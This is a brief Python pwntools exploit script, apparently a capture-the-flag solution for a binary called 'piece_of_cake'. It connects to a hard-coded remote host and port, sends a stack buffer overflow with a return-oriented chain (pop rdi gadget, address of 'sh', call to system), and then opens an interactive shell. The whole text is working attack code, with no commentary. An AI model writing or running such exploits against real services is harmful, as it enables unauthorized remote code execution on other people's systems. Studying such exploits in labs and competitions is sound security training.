from pwn import *

BIN = './piece_of_cake'
# p = process(BIN)
p = remote('141.85.224.106', 31345)
elf = ELF(BIN)
rop = ROP(BIN)

rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
sh = next(elf.search(b'sh\x00'))
call_system = 0x40117f
padding = 0x28

payload = padding * b'a' + p64(rdi) + p64(sh) + p64(call_system)
p.sendline(payload)

p.interactive()
